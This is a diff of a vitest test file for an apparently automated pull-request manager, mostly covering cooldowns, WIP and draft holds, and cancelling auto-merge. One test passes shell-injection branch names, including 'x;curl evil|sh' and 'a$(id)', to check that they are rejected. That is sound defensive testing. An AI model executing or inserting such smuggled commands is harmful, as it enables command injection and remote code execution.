@@ -1,7 +1,8 @@
 import { existsSync, readFileSync } from "node:fs";
 import { dirname, join } from "node:path";
 import { fileURLToPath } from "node:url";
-import { describe, expect, it } from "vitest";
+import { describe, expect, it, vi } from "vitest";
+import { planWithLiveWipGuard } from "../src/cli/gh-manager.js";
 import { Decision, inert, type LiveState, planDecision, planNoDecision, planRoute } from "../src/gh-manager/decision.js";
 import { renderDigest } from "../src/gh-manager/digest.js";
 import { GhManagerPolicy, humanGatedPaths, parsePolicy } from "../src/gh-manager/policy.js";
@@ -25,9 +26,9 @@ function pr(over: Partial<PullRequestFacts> = {}): PullRequestFacts {
 const route = (over: Partial<PullRequestFacts> = {}, p = policy()) => routePullRequest(pr(over), p, NOW);
 
 describe("policy", () => {
-  it("defaults to an 8 hour cooldown, 48 for drafts, and every action on", () => {
+  it("defaults to a 24 hour cooldown, 48 for rescued draft escalation, and every action on", () => {
     expect(parsePolicy('{"version":1}')).toEqual({
-      version: 1, enabled: true, quietHours: 8, draftQuietHours: 48, maxSessionsPerRun: 4, maxAttemptsPerPullRequest: 2,
+      version: 1, enabled: true, quietHours: 24, draftQuietHours: 48, maxSessionsPerRun: 4, maxAttemptsPerPullRequest: 2,
       sessionBeforeMerge: false, closeGraceDays: 7, protectedPaths: [], model: "claude-opus-5-5",
       actions: { merge: true, repair: true, review: true, undraft: true, close: true },
     });
@@ -94,15 +95,14 @@ describe("marker", () => {
 describe("routing one pull request", () => {
   it("hands a rescued-trunk draft to a human past the draft quiet period, never a session", () => {
     const wip = { isDraft: true, headRefName: "wip/trunk-2026-10-08-box", checks: [{ name: "conventions", state: "failure" as const }] };
-    expect(route({ ...wip, headCommittedAt: hoursAgo(47.9) })).toMatchObject({ route: "skip", reason: "active" });
+    expect(route({ ...wip, headCommittedAt: hoursAgo(47.9) })).toMatchObject({ route: "skip", reason: "work-in-progress" });
     expect(route({ ...wip, headCommittedAt: hoursAgo(48) })).toMatchObject({ route: "escalate", reason: "rescued-trunk-edits" });
     // Once escalated on this head, it waits on the human like any escalation.
     expect(route({ ...wip, headCommittedAt: hoursAgo(48), labels: ["manager:needs-human"], marker: { head: HEAD, verdict: "escalate", attempts: 0, at: hoursAgo(1) } })).toMatchObject({ route: "skip", reason: "escalated" });
-    // Adopted — marked ready or reviewed — it follows the ordinary routes.
+    // Marking it ready removes the draft hold, but the WIP branch still holds it.
     expect(route({ ...wip, isDraft: false, headCommittedAt: hoursAgo(48) }).reason).not.toBe("rescued-trunk-edits");
     expect(route({ ...wip, headCommittedAt: hoursAgo(48), labels: ["agent-reviewed"] }).reason).not.toBe("rescued-trunk-edits");
-    // Only the rescue prefix: an ordinary draft still gets a session.
-    expect(route({ ...wip, headRefName: "wip/other", headCommittedAt: hoursAgo(48) }).route).toBe("session");
+    expect(route({ ...wip, headRefName: "wip/other", headCommittedAt: hoursAgo(48) })).toMatchObject({ route: "skip", reason: "work-in-progress" });
   });
   it("leaves bot lanes and untrusted authors alone", () => {
     expect(route({ author: "morpheus-security[bot]" })).toMatchObject({ route: "skip", reason: "bot-lane" });
@@ -129,15 +129,16 @@ describe("routing one pull request", () => {
     expect(route({ authorAssociation: "CONTRIBUTOR", authorPermission: "admin", isCrossRepository: true })).toMatchObject({ route: "skip", reason: "untrusted-author" });
   });
 
-  it("applies the cooldown at its boundary: under 8h is active, exactly 8h is not", () => {
-    expect(route({ headCommittedAt: hoursAgo(7.99) })).toMatchObject({ route: "skip", reason: "active" });
-    expect(route({ headCommittedAt: hoursAgo(8) }).reason).not.toBe("active");
+  it("applies the cooldown at its boundary: under 24h is active, exactly 24h is not", () => {
+    expect(route({ headCommittedAt: hoursAgo(23.99) })).toMatchObject({ route: "skip", reason: "active" });
+    expect(route({ headCommittedAt: hoursAgo(24) }).reason).not.toBe("active");
   });
-  it("gives a draft 48 hours before presuming it abandoned", () => {
-    expect(route({ isDraft: true, headCommittedAt: hoursAgo(47.9) })).toMatchObject({ route: "skip", reason: "active" });
-    expect(route({ isDraft: true, headCommittedAt: hoursAgo(48) })).toMatchObject({ route: "session", reason: "needs-judgment" });
-    // The same age on a ready pull request is long past its own cooldown.
-    expect(route({ headCommittedAt: hoursAgo(47.9) })).toMatchObject({ route: "session" });
+  it("leaves drafts and explicit WIP markers out of the merge flow at any age", () => {
+    for (const over of [{ isDraft: true }, { headRefName: "wip/feature" }, { title: "[WIP] Add a thing" }, { title: "WIP: Add a thing" }]) {
+      expect(route({ ...over, headCommittedAt: hoursAgo(100), labels: ["agent-reviewed"] })).toMatchObject({ route: "skip", reason: "work-in-progress" });
+      expect(route({ ...over, headCommittedAt: hoursAgo(100), labels: ["agent-reviewed"], autoMerge: true })).toMatchObject({ route: "hold", reason: "wip-auto-merge" });
+    }
+    expect(route({ title: "Add a WIP note", headCommittedAt: hoursAgo(24), labels: ["agent-reviewed"] })).toMatchObject({ route: "merge", reason: "reviewed-and-green" });
   });
   it("treats an unreadable commit date as active rather than old", () => {
     expect(route({ headCommittedAt: "not a date" })).toMatchObject({ route: "skip", reason: "active" });
@@ -146,7 +147,7 @@ describe("routing one pull request", () => {
   it("counts quiet from when the pull request appeared, not from an old commit date", () => {
     // Committed days ago, opened an hour ago: the author is plausibly still here.
     expect(route({ headCommittedAt: hoursAgo(90), createdAt: hoursAgo(1) })).toMatchObject({ route: "skip", reason: "active" });
-    expect(route({ headCommittedAt: hoursAgo(90), createdAt: hoursAgo(8) }).reason).not.toBe("active");
+    expect(route({ headCommittedAt: hoursAgo(90), createdAt: hoursAgo(24) }).reason).not.toBe("active");
   });
   it("will not brief a session on a branch name that is not plain", () => {
     for (const headRefName of ["x;curl evil|sh", "a$(id)", "a`id`", "a b", "a'b"]) {
@@ -195,7 +196,7 @@ describe("routing one pull request", () => {
     expect(route()).toMatchObject({ route: "session", detail: "no completed review" });
     expect(route({ labels: ["agent-reviewed"], mergeable: "CONFLICTING" })).toMatchObject({ route: "session", detail: "conflicts with the base" });
     expect(route({ labels: ["agent-reviewed"], checks: [{ name: "pr / conventions", state: "failure" }] })).toMatchObject({ route: "session", detail: "failing: pr / conventions" });
-    expect(route({ labels: ["agent-reviewed"], isDraft: true, headCommittedAt: hoursAgo(72) })).toMatchObject({ route: "session", detail: "draft" });
+    expect(route({ labels: ["agent-reviewed"], isDraft: true, headCommittedAt: hoursAgo(72) })).toMatchObject({ route: "skip", reason: "work-in-progress" });
     expect(route({}, policy({ actions: { review: false, repair: false } }))).toMatchObject({ route: "skip", reason: "sessions-disabled" });
   });
 
@@ -212,8 +213,8 @@ describe("routing one pull request", () => {
 
   it("leaves an incomplete draft alone until it gets a push", () => {
     const marker = { head: HEAD, verdict: "incomplete" as const, attempts: 1, at: hoursAgo(72) };
-    expect(route({ isDraft: true, headCommittedAt: hoursAgo(100), labels: ["manager:incomplete"], marker })).toMatchObject({ route: "skip", reason: "incomplete" });
-    expect(route({ isDraft: true, headCommittedAt: hoursAgo(100), labels: ["manager:incomplete"], marker: { ...marker, head: OTHER } })).toMatchObject({ route: "session" });
+    expect(route({ isDraft: true, headCommittedAt: hoursAgo(100), labels: ["manager:incomplete"], marker })).toMatchObject({ route: "skip", reason: "work-in-progress" });
+    expect(route({ isDraft: true, headCommittedAt: hoursAgo(100), labels: ["manager:incomplete"], marker: { ...marker, head: OTHER } })).toMatchObject({ route: "skip", reason: "work-in-progress" });
   });
 
   it("closes a stale pull request only once the grace period has fully elapsed", () => {
@@ -231,14 +232,14 @@ describe("sweep", () => {
   it("holds sessions to the budget, closest-to-merging first", () => {
     const prs = [
       pr({ number: 1, isDraft: true, headCommittedAt: hoursAgo(500) }),
-      pr({ number: 2, headCommittedAt: hoursAgo(20) }),
+      pr({ number: 2, headCommittedAt: hoursAgo(30) }),
       pr({ number: 3, headCommittedAt: hoursAgo(90) }),
-      pr({ number: 4, labels: ["agent-reviewed"], mergeable: "CONFLICTING", headCommittedAt: hoursAgo(10) }),
+      pr({ number: 4, labels: ["agent-reviewed"], mergeable: "CONFLICTING", headCommittedAt: hoursAgo(30) }),
       pr({ number: 5, labels: ["agent-reviewed"] }),
     ];
     const routed = sweep(prs, policy({ maxSessionsPerRun: 2 }), NOW);
     expect(routed.map(r => [r.number, r.route, r.reason])).toEqual([
-      [1, "skip", "session-budget"],
+      [1, "skip", "work-in-progress"],
       [2, "skip", "session-budget"],
       [3, "session", "needs-judgment"],
       [4, "session", "needs-judgment"],
@@ -250,7 +251,7 @@ describe("sweep", () => {
   });
 });
 
-const live = (over: Partial<LiveState> = {}): LiveState => ({ headSha: HEAD, isDraft: false, labels: [], autoMerge: false, body: "## Test plan\nran it", changedFiles: ["src/a.ts"], cancelledRunIds: [], sessionPushed: "nothing", ...over });
+const live = (over: Partial<LiveState> = {}): LiveState => ({ headSha: HEAD, title: "Add a thing", headRefName: "ev-1-thing", isDraft: false, labels: [], autoMerge: false, body: "## Test plan\nran it", changedFiles: ["src/a.ts"], cancelledRunIds: [], sessionPushed: "nothing", ...over });
 const ctx = (over: Record<string, unknown> = {}) => ({ policy: policy(over), attempts: 0, now: NOW, runUrl: "https://example.test/run/1" });
 const decision = (over: Record<string, unknown> = {}) => Decision.parse({ version: 1, pr: 7, head: HEAD, action: "merge", summary: "Reviewed the change and fixed one bug.", reasoning: "Checks pass and the review is complete.", ...over });
 const kinds = (plan: { operations: { kind: string }[] }) => plan.operations.map(op => op.kind === "add-label" || op.kind === "remove-label" ? `${op.kind}:${(op as unknown as { label: string }).label}` : op.kind);
@@ -281,6 +282,14 @@ describe("applying a session's decision", () => {
     const plan = planDecision(decision(), live({ labels: ["agent-reviewed"], cancelledRunIds: [9], sessionPushed: "trunk-merges" }), ctx());
     expect(kinds(plan)).toEqual(["comment", "rerun", "auto-merge"]);
     expect(parseMarker((plan.operations[0] as { body: string }).body)).not.toHaveProperty("cleared");
+  });
+  it("recovers a missing author-review label only after validating its committed record", () => {
+    const verified = planDecision(decision(), live({ labels: ["manager:needs-human"], authorRecordValid: true }), ctx());
+    expect(kinds(verified)).toEqual(["comment", "remove-label:manager:needs-human", "add-label:agent-reviewed", "auto-merge"]);
+    const invalid = planDecision(decision(), live({ authorRecordProblem: "review does not cover head" }), ctx());
+    expect(invalid.verdict).toBe("escalate");
+    expect(kinds(invalid)).not.toContain("add-label:agent-reviewed");
+    expect(planDecision(decision(), live(), ctx()).verdict).toBe("escalate");
   });
   it("will not merge on the author's review when the session pushed anything but exact trunk merges", () => {
     for (const sessionPushed of ["other", "unverified"] as const) {
@@ -333,22 +342,22 @@ describe("applying a session's decision", () => {
     expect(plan.verdict).toBe("wait");
     expect(kinds(plan)).toEqual(["comment"]);
   });
-  it("marks a draft ready only when the session judged it complete", () => {
+  it("refuses an in-flight session's merge when the PR becomes WIP, even if it asks to mark ready", () => {
     const d = { usedManagerReview: true, body: RECORD_BODY };
-    expect(planDecision(decision(d), live({ isDraft: true }), ctx())).toMatchObject({ verdict: "escalate" });
-    expect(kinds(planDecision(decision({ ...d, markReady: true }), live({ isDraft: true }), ctx()))).toContain("ready");
-    expect(planDecision(decision({ ...d, markReady: true }), live({ isDraft: true }), ctx({ actions: { undraft: false } }))).toMatchObject({ verdict: "escalate" });
+    for (const over of [{ isDraft: true }, { headRefName: "wip/feature" }, { title: "[WIP] Add a thing" }]) {
+      expect(kinds(planDecision(decision({ ...d, markReady: true }), live(over), ctx()))).toEqual([]);
+      expect(kinds(planDecision(decision({ ...d, markReady: true }), live({ ...over, autoMerge: true }), ctx()))).toEqual(["comment", "disable-auto-merge"]);
+    }
   });
   it("escalating takes back auto-merge and the manager's own label", () => {
     const plan = planDecision(decision({ action: "escalate", needsHuman: "Decide whether the price column may be hidden." }), live({ autoMerge: true, labels: ["manager-reviewed"] }), ctx());
     expect(kinds(plan)).toEqual(["comment", "disable-auto-merge", "remove-label:manager-reviewed", "add-label:manager:needs-human"]);
     expect((plan.operations[0] as { body: string }).body).toContain("**Needs you:** Decide whether the price column may be hidden.");
   });
-  it("marks an unfinished draft incomplete, naming what is missing", () => {
+  it("leaves an unfinished draft for its author", () => {
     const plan = planDecision(decision({ action: "incomplete", missing: "The reorder gesture is not persisted." }), live({ isDraft: true }), ctx());
-    expect(plan.verdict).toBe("incomplete");
-    expect(kinds(plan)).toEqual(["comment", "add-label:manager:incomplete"]);
-    expect((plan.operations[0] as { body: string }).body).toContain("**Still missing:** The reorder gesture is not persisted.");
+    expect(plan.verdict).toBe("wait");
+    expect(kinds(plan)).toEqual([]);
   });
   it("closes at once only when the superseding pull request really merged", () => {
     const d = decision({ action: "close", supersededBy: 12 });
@@ -451,9 +460,32 @@ describe("applying a route that needed no session", () => {
   it("does nothing when the branch moved after the sweep", () => {
     expect(planRoute(routed({}), live({ headSha: OTHER }), ctx()).operations).toEqual([]);
   });
+  it("cancels a queued merge when the live PR is WIP, including a changed head", () => {
+    const plan = planRoute(routed({}), live({ headSha: OTHER, title: "WIP: Add a thing", autoMerge: true }), ctx());
+    expect(kinds(plan)).toEqual(["comment", "disable-auto-merge"]);
+    expect(kinds(planRoute(routed({ route: "hold" }), live({ isDraft: true, autoMerge: true }), ctx()))).toEqual(["comment", "disable-auto-merge"]);
+    expect(kinds(planRoute(routed({ route: "hold" }), live({ isDraft: true }), ctx()))).toEqual([]);
+    expect(kinds(planRoute(routed({ route: "escalate", reason: "rescued-trunk-edits" }), live({ isDraft: true, headRefName: "wip/trunk-2026-10-08-box" }), ctx()))).toEqual(["comment", "add-label:manager:needs-human"]);
+  });
   it("closes and escalates", () => {
     expect(kinds(planRoute(routed({ route: "close" }), live({ labels: ["manager:stale"] }), ctx()))).toEqual(["comment", "remove-label:manager:stale", "close"]);
     expect(kinds(planRoute(routed({ route: "escalate" }), live(), ctx()))).toEqual(["comment", "add-label:manager:needs-human"]);
+  });
+});
+
+describe("applying a session after the PR becomes WIP", () => {
+  const routed = { number: 7, title: "t", headSha: HEAD, route: "session" as const, reason: "needs-judgment", detail: "review", attempts: 1 };
+  it("does not enter evidence publication for a late WIP merge decision", () => {
+    const publishAndPlan = vi.fn(() => planDecision(decision({ usedManagerReview: true, body: RECORD_BODY }), live({ autoMerge: true }), ctx()));
+    const plan = planWithLiveWipGuard(live({ isDraft: true, autoMerge: true }), routed, ctx(), publishAndPlan);
+    expect(publishAndPlan).not.toHaveBeenCalled();
+    expect(kinds(plan)).toEqual(["comment", "disable-auto-merge"]);
+  });
+  it("cancels queued auto-merge even when the session wrote no usable decision", () => {
+    const noDecision = vi.fn(() => planNoDecision("no decision file", live(), ctx()));
+    const plan = planWithLiveWipGuard(live({ title: "WIP: Add a thing", autoMerge: true }), routed, ctx(), noDecision);
+    expect(noDecision).not.toHaveBeenCalled();
+    expect(kinds(plan)).toEqual(["comment", "disable-auto-merge"]);
   });
 });
 
